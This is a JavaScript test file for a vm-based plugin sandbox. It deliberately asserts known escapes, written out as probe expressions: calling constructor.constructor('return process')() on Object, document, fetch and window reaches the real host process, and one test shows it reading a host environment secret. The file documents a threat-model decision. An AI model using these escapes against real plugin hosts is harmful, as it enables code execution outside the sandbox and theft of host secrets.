// Characterisation tests for the plugin sandbox.
//
// These assert that the sandbox can be escaped. That is not a bug report, it is
// a boundary marker: `vm.createContext` isolates globals, not capabilities, and
// any host-realm object handed to a plugin carries `constructor.constructor`,
// which is the `Function` constructor of the host realm. From there, `process`
// is one call away.
//
// Why keep asserting a hole: A-5's report listed "vm is not a security
// boundary" as P0 and asked for a decision. These tests make the decision
// executable — if someone later replaces `vm` with an isolated realm, this file
// fails, which is exactly when the docs and the threat model need updating.
//
// The actual mitigation is upstream of the sandbox: plugins come from npm and
// are trusted at install time, the way VS Code treats extensions. Do not read
// "sandboxed" anywhere in this repo as "safe against a malicious plugin".

import test from 'node:test';
import assert from 'node:assert/strict';

import { createHostEnvironment } from '../src/loader.mjs';

function env() {
  return createHostEnvironment({});
}

/** Evaluate an expression inside the plugin realm and return its value. */
function probe(e, expr) {
  const wrapped = `(function(){ try { return (${expr}); } catch (err) { return { __threw: String(err && err.message) }; } })()`;
  return e.runScript(wrapped, 'probe.js');
}

function isRealProcess(v) {
  return !!v && typeof v === 'object' && typeof v.pid === 'number' && typeof v.versions === 'object'
    && v.versions !== null && Object.keys(v.versions).length > 0;
}

test('the injected process is a shim, and reading it does not throw', () => {
  const e = env();
  assert.equal(probe(e, 'typeof process'), 'object');
  assert.equal(probe(e, 'process.env.NODE_ENV'), 'production');
  assert.equal(probe(e, 'process.platform'), 'android');
  // Frozen: a plugin cannot poison the shim for the next plugin. Slopy mode
  // makes the assignment a silent no-op rather than a throw, so assert on the
  // value, not on an exception.
  assert.equal(probe(e, '(function(){ process.env.X = 1; return process.env.X; })()'), undefined);
});

test('escape 1: host Object.constructor reaches the real process', () => {
  const e = env();
  const v = probe(e, 'Object.constructor("return process")()');
  assert.ok(isRealProcess(v), 'expected the host process; if this fails the sandbox got stronger — update the threat model');
  assert.equal(v.pid, process.pid);
});

test('escape 2: document.constructor.constructor reaches the real process', () => {
  const e = env();
  const v = probe(e, 'document.constructor.constructor("return process")()');
  assert.ok(isRealProcess(v));
});

test('escape 3: any injected host function carries the host Function', () => {
  const e = env();
  const v = probe(e, 'fetch.constructor("return process")()');
  assert.ok(isRealProcess(v));
});

test('escape 4: the window shim is a host object and leaks the same way', () => {
  const e = env();
  const v = probe(e, 'window.constructor.constructor("return process")()');
  assert.ok(isRealProcess(v));
});

test('consequence: the escaped process exposes real runtime secrets', () => {
  const e = env();
  // This is the concrete harm: not "the plugin can call a function", but "the
  // plugin can read every secret the host put in its environment".
  process.env.DSH_ESCAPE_PROBE = 'leaked-value';
  try {
    const v = probe(e, 'Object.constructor("return process")().env.DSH_ESCAPE_PROBE');
    assert.equal(v, 'leaked-value');
  } finally {
    delete process.env.DSH_ESCAPE_PROBE;
  }
});

test('the sandbox does isolate what it claims to: globals and timers', () => {
  const e = env();
  // A plugin writing a global must not see it from the host realm.
  probe(e, 'globalThis.__leak = 1');
  assert.equal(globalThis.__leak, undefined);
  // Timers are tracked, so unload can clear them.
  probe(e, 'setTimeout(function(){}, 60000)');
  assert.equal(e.timers.size, 1);
  e.dispose();
  assert.equal(e.timers.size, 0);
});
